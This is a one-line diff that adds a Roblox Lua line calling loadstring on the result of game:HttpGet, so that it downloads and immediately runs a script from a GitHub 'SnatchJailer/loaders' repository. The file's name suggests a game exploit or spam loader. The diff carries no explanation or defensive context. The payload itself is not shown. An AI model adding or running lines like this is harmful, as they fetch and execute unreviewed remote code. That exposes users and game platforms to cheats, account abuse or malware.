@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/upd-8-cvr-retro-spam4-nf8l8y8pgpjobf.lua"))()
